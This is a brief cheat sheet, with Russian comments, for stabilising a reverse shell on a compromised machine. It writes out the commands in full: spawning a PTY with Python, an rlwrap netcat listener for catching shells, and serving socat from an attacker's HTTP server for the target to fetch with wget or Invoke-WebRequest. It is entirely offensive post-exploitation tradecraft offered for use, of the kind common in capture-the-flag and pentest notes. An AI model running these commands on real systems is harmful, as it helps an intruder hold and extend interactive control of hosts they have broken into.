#a. python
/\*
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash
Ctrl+Z

stty raw -echo; fg

enter x2
\*/

#b. rlwrap ( в основном windows)

rlwrap nc -lvnp <port>
Ctrl+Z
stty raw -echo; fg
enter x2

#c. socat

Атакующая машина: sudo python3 -m http.server 80
Целевая машина:
Linux: wget <LOCAL-IP>/socat -O /tmp/socat
Windows: Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe

stty -a в другом терминале для получения необходимых параметров

в reverse shell терминале:
stty rows <number>
stty cols <number>
